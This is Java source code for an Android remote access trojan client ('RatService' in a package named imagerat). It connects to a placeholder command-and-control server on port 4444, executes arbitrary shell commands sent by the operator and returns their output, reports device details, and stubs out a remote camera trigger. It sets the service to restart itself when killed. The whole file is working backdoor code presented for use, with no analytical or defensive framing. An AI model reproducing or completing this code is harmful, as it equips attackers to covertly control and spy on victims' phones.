package com.imagerat.client;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.Socket;

public class RatService extends Service {
    // Replace with your C2 server IP and Port
    private String IP = "YOUR_IP_ADDRESS"; 
    private int PORT = 4444;

    @Override
    public void onCreate() {
        super.onCreate();
        // Start the connection thread
        new Thread(this::connectToServer).start();
    }

    private void connectToServer() {
        try {
            Socket socket = new Socket(IP, PORT);
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            while (true) {
                String cmd = in.readLine();
                if (cmd == null) break;

                // Command processing logic
                if (cmd.startsWith("shell")) {
                    executeShell(cmd.substring(6), out);
                } else if (cmd.equals("deviceInfo")) {
                    out.println("Model: " + android.os.Build.MODEL);
                } else if (cmd.equals("takepic")) {
                    // Trigger camera logic here
                    out.println("Camera triggered");
                }
                // Add more command handlers here
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void executeShell(String command, PrintWriter out) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
        } catch (IOException e) {
            out.println("Error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Ensure service restarts if killed by OS
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

